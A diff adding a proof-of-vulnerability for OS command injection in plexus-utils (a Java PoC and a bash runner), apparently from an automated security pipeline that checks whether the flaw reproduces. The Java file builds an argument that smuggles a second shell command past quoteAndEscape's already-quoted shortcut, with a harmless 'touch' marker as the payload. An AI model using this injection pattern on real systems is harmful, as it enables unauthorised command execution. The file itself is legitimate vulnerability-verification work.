@@ -1,0 +1,105 @@
+diff --git a/.security-pipeline/pov/CommandInjectionPov.class b/.security-pipeline/pov/CommandInjectionPov.class
+new file mode 100644
+index 0000000..6ff9cc7
+Binary files /dev/null and b/.security-pipeline/pov/CommandInjectionPov.class differ
+diff --git a/.security-pipeline/pov/CommandInjectionPov.java b/.security-pipeline/pov/CommandInjectionPov.java
+new file mode 100644
+index 0000000..1ff01f0
+--- /dev/null
++++ b/.security-pipeline/pov/CommandInjectionPov.java
+@@ -0,0 +1,76 @@
++import org.codehaus.plexus.util.cli.Commandline;
++import org.codehaus.plexus.util.cli.shell.BourneShell;
++
++import java.io.File;
++
++/**
++ * Proof-of-Vulnerability for CWE-078 (OS Command Injection) in plexus-utils
++ * Commandline / Shell / StringUtils.quoteAndEscape.
++ *
++ * Root cause: StringUtils.quoteAndEscape() trusts any argument that already
++ * starts and ends with the shell's quote delimiter and returns it verbatim
++ * (the `source.startsWith(quoteChar) && source.endsWith(quoteChar)` shortcut).
++ * A BourneShell argument that begins and ends with a single quote therefore
++ * bypasses all neutralization. By embedding `' ; <cmd> ; '` an attacker breaks
++ * out of the quoting and injects an arbitrary command into the string that
++ * Commandline.execute() hands to `/bin/sh -c`.
++ *
++ * This POV drives the REAL project flow:
++ *   Commandline.setExecutable / createArg / execute -> Runtime.exec(/bin/sh -c ...)
++ * and observes the concrete side effect (a marker file created by the injected
++ * command).
++ *
++ * Exit 0  => injected command executed  => VULNERABLE (unpatched).
++ * Exit 1  => injected command neutralized => patched / not vulnerable.
++ */
++public class CommandInjectionPov
++{
++    public static void main( String[] args )
++        throws Exception
++    {
++        File marker = new File( System.getProperty( "java.io.tmpdir" ), "plexus_pov_injected_marker" );
++        if ( marker.exists() )
++        {
++            marker.delete();
++        }
++
++        // The attacker-controlled argument. It starts and ends with a single
++        // quote (BourneShell's argument quote delimiter) so quoteAndEscape's
++        // "already quoted" shortcut returns it unchanged, letting the embedded
++        // `; touch <marker> ;` sequence break out of the quotes.
++        String malicious = "'a' ; touch " + marker.getAbsolutePath() + " ; 'b'";
++
++        // Build the command line using the real public API.
++        Commandline cli = new Commandline( new BourneShell() );
++        cli.setExecutable( "echo" );
++        cli.createArg().setValue( malicious );
++
++        String[] rendered = cli.getShellCommandline();
++        System.out.println( "[pov] executable    : echo" );
++        System.out.println( "[pov] tainted arg   : " + malicious );
++        System.out.println( "[pov] shell argv[-1]: " + rendered[rendered.length - 1] );
++
++        // Actually execute it through the vulnerable flow.
++        Process p = cli.execute();
++        p.getInputStream().close();
++        p.getErrorStream().close();
++        int rc = p.waitFor();
++        System.out.println( "[pov] process exit  : " + rc );
++
++        // Give the filesystem a beat, then check the side effect.
++        boolean injected = marker.exists();
++        System.out.println( "[pov] marker file   : " + marker.getAbsolutePath() + " exists=" + injected );
++
++        if ( injected )
++        {
++            marker.delete();
++            System.out.println( "[pov] RESULT: VULNERABLE - injected command executed via /bin/sh -c" );
++            System.exit( 0 );
++        }
++        else
++        {
++            System.out.println( "[pov] RESULT: NOT VULNERABLE - injection was neutralized" );
++            System.exit( 1 );
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..5ab2e1f
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,13 @@
++#!/usr/bin/env bash
++# POV runner for CWE-078 OS Command Injection in plexus-utils.
++# Exits 0 when the injection reproduces (vulnerable), non-zero otherwise.
++set -e
++cd /workspace/repo
++
++# Ensure product classes are compiled.
++if [ ! -d target/classes ]; then
++  mvn -B -q -DskipTests package
++fi
++
++javac -cp target/classes -d .security-pipeline/pov .security-pipeline/pov/CommandInjectionPov.java
++java -cp target/classes:.security-pipeline/pov CommandInjectionPov
